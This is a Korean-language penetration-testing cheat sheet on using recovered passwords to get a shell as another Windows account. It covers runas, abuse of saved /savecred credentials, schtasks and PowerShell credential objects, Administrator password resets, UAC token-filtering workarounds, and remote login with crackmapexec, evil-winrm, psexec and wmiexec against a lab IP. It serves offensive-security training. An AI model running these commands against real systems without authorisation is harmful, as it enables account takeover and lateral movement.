# runas — 다른 사용자로 전환 (Windows)

한 줄 요약: 열거로 확보한 패스워드를 다른 계정(RID 500 등)에 시도해서 그 컨텍스트의 쉘을 얻는 기법.
쉘이 인터랙티브(console/RDP)냐 비대화형(리버스 쉘·evil-winrm·웹쉘)이냐로 방법이 갈린다.

> 관련 문서: [Windows 권한 치트시트](./windows_privileges.md) · [evil-winrm](./evil-winrm.md)

## 사전 확인

```cmd
whoami
cmdkey /list
```

- winPEAS의 사용자 정보에서 RID 500이면 내장 Administrator다. 패스워드 후보가 나오면 이 계정부터 시도.
- `cmdkey /list`에 저장된 크리덜(`Target: Domain:interactive=...`)이 보이면 아래 `/savecred` 남용이 바로 가능.

## 인터랙티브 콘솔이면: runas

```cmd
runas /user:Administrator cmd.exe
```

- 플래그는 `/user:`다. `/usr:`은 없는 옵션이라 usage만 출력되고 끝난다.
- 패스워드는 콘솔에서 직접 입력받는다. 파이프·리다이렉션으로 전달 불가.
- 도메인이 섞인 환경에서 로컬 계정을 명시할 때: `runas /user:.\Administrator cmd.exe`
- 알아두면 좋은 플래그: `/profile`(프로필 로드, 기본), `/env`(현재 환경 유지), `/netonly`(도메인 크리덜, 원격 접근 전용)

### 저장된 크리덜로 패스워드 없이 실행

```cmd
runas /savecred /user:USER "cmd.exe /c whoami > C:\temp\out.txt"
```

- `cmdkey /list`에서 크리덜이 확인됐으면 패스워드 프롬프트 없이 실행된다.

## 비대화형 쉘이면 (리버스 쉘·evil-winrm·웹쉘)

runas는 패스워드를 콘솔 핸들에서 직접 읽어서 비대화형 쉘에서는 프롬프트가 안 보이고 멈춘 것처럼 된다.
이때는 아래 방법으로 갈아탄다.

### schtasks (제일 확실)

```cmd
schtasks /create /f /tn t1 /tr "cmd /c whoami > C:\temp\out.txt" /sc once /st 23:59 /ru Administrator /rp PASSWORD
schtasks /run /tn t1
type C:\temp\out.txt
schtasks /delete /f /tn t1
```

- `/ru` 실행할 계정, `/rp` 그 계정의 패스워드. 출력은 파일로 빼서 확인한다.
- `/tr` 안에서 리다이렉션이 필요하면 `cmd /c`로 감싼다.

### PowerShell 자격증명 객체

```powershell
$pass = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('.\Administrator', $pass)
Start-Process -FilePath 'cmd.exe' -Credential $cred
```

- 새 창을 띄우기 때문에 콘솔/RDP 세션에서만 안정적이다. 서비스 세션에서는 실패할 수 있으니 schtasks로.

### 이미 High Integrity(관리자)면 패스워드 리셋도 방법

```cmd
net user Administrator NewPass123!
```

- 흔적이 남고 기존 세션·인증을 깨뜨릴 수 있어 최후 수단으로 쓴다.

## 패스워드가 있으면 쉘 전환보다 원격 접속이 빠를 때 (Kali)

```bash
crackmapexec smb 192.168.80.200 -u Administrator -p 'PASSWORD'   # (Possible)Pwn3d! 확인
evil-winrm -i 192.168.80.200 -u Administrator -p 'PASSWORD'
psexec.py Administrator:'PASSWORD'@192.168.80.200
wmiexec.py Administrator:'PASSWORD'@192.168.80.200
xfreerdp /u:Administrator /p:'PASSWORD' /v:192.168.80.200 /dynamic-resolution
```

- 같은 계정이라도 접근 경로(RDP·WinRM·SMB·WMI)마다 성공 여부가 다르다. 여러 개를 돌려본다.

## 흔한 실패와 원인

- 프롬프트 없이 멈춤: 비대화형 쉘에서 runas를 시도한 것. schtasks로 전환.
- `Logon failure: unknown user name or bad password`: 계정명·도메인 확인. 로컬 계정이면 `.\`를 붙여본다.
- `The directory name is invalid`: 해당 사용자의 프로필 디렉터리가 없는 경우. schtasks·Start-Process로 우회.
- 원격 로그온한 로컬 관리자인데 권한이 낮게 보임: UAC 원격 토큰 필터링(RID 500은 기본 예외). 콘솔·schtasks 경로로 우회.
